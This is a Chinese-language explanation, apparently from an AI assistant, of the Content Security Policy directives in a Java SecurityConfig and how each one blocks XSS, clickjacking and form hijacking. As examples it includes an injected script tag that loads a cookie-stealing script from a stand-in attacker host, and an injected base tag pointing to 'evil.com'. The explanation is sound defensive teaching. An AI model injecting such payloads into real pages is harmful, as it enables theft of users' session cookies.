**CSP (Content Security Policy，內容安全政策)** 是現代 Web 安全中**最強大、最核心的防禦 XSS（跨站腳本攻擊）的機制**。

簡單來說，它就像是瀏覽器端的一道 **「白名單防火牆」**。傳統的 XSS 防禦（如過濾輸入）是「黑名單」思維，試圖找出所有壞東西並阻擋；而 CSP 是「白名單」思維，**直接告訴瀏覽器：「除了我允許的來源，其他任何外部資源（腳本、樣式、圖片等）一律不准載入或執行。」**

即使駭客成功找到了注入惡意程式碼的漏洞，只要 CSP 設定得夠嚴格，瀏覽器也會直接拒絕執行該惡意程式碼。

---

### 在您提供的 `SecurityConfig.java` 中，CSP 是如何設定的？

程式碼中透過 `contentSecurityPolicy` 設定了一組極其嚴格的白名單指令（`policyDirectives`）。以下為您逐一拆解這些指令的意義與防護目的：

```java
"default-src 'self'; 
 script-src 'self'; 
 style-src 'self' 'unsafe-inline'; 
 img-src 'self' data: https://wmts.nlsc.gov.tw; 
 font-src 'self' data:; 
 frame-ancestors 'none'; 
 object-src 'none'; 
 base-uri 'self'; 
 form-action 'self'"
```

#### 1. 核心資源載入控制（防 XSS 主力）
*   **`default-src 'self'`**：預設規則。如果沒有特別指定，所有資源（腳本、樣式、圖片等）都**只允許從「同源」（Same Origin，即相同的協議、網域、端口）載入**。
*   **`script-src 'self'`**：**最嚴格的 JS 限制**。只允許執行同源的 JavaScript。**禁止**載入外部 CDN 的 JS，也**禁止**執行頁面內嵌的 `<script>...</script>` 或 `onclick="..."` 等 inline 腳本。這直接掐斷了 99% 的 XSS 攻擊路徑。
*   **`style-src 'self' 'unsafe-inline'`**：允許同源 CSS 和 inline style（`style="..."`）。通常前端框架（如 Vue/React）或某些 UI 元件庫會動態生成 inline style，因此必須放寬此項。
*   **`img-src 'self' data: https://wmts.nlsc.gov.tw`**：允許同源圖片、Base64 編碼圖片（`data:`），以及**明確允許載入「國土測繪中心 (NLSC)」的 WMTS 圖資服務**（這應該是系統中用來渲染地圖的特定需求）。
*   **`font-src 'self' data:`**：允許同源字型與 Base64 字型（通常用於 Icon font 或内嵌字型）。

#### 2. 頁面結構與嵌入控制（防 Clickjacking 點擊劫持）
*   **`frame-ancestors 'none'`**：**禁止任何網站使用 `<iframe>` 嵌入您的頁面**。這比傳統的 `X-Frame-Options: DENY` 更現代且強大，能有效防止駭客把您的頁面藏在透明的 iframe 裡，誘導使用者點擊（點擊劫持）。

#### 3. 阻斷舊式漏洞與表單劫持
*   **`object-src 'none'`**：完全禁止 `<object>`、`<embed>`、`<applet>` 等外掛標籤。防止駭客利用舊式瀏覽器外掛漏洞執行惡意程式。
*   **`base-uri 'self'`**：限制 `<base>` 標籤只能指向同源。防止駭客注入 `<base href="evil.com">` 來篡改頁面中所有相對路徑的解析，將請求導向惡意網站。
*   **`form-action 'self'`**：限制 `<form>` 表單的提交目標（`action`）只能是同源。防止駭客篡改表單的提交地址，將使用者的帳密或敏感資料偷偷發送到駭客的伺服器（表單劫持/釣魚）。

---

### CSP 防禦 XSS 的實際場景舉例

假設您的系統有一個留言功能，駭客輸入了一段惡意程式碼：
`<script src="https://evil-hacker.com/steal-cookie.js"></script>`

**如果沒有 CSP：**
瀏覽器會乖乖地去 `evil-hacker.com` 下載這段 JS 並執行，駭客成功竊取其他使用者的 Cookie。

**如果有您設定的 CSP (`script-src 'self'`)：**
1. 瀏覽器準備載入 `https://evil-hacker.com/steal-cookie.js`。
2. 瀏覽器檢查 CSP 標頭，發現 `script-src` 只允許 `'self'`（即您自己的網域）。
3. 瀏覽器**直接阻擋**該請求，並在開發者工具 (Console) 拋出 `Refused to load the script...` 的錯誤。
4. 惡意腳本**完全不會被執行**，攻擊失敗。

### 總結
這個 CSP 設定是經過精心調校的：它既保持了**極高的安全性**（嚴格限制 JS 與外部框架），又兼顧了**業務的可用性**（放寬了 inline CSS、Base64 圖片，並特許了國土測繪中心的地圖 API）。這是符合現代政府/金融級資安健檢（如 OWASP Top 10）的標準做法。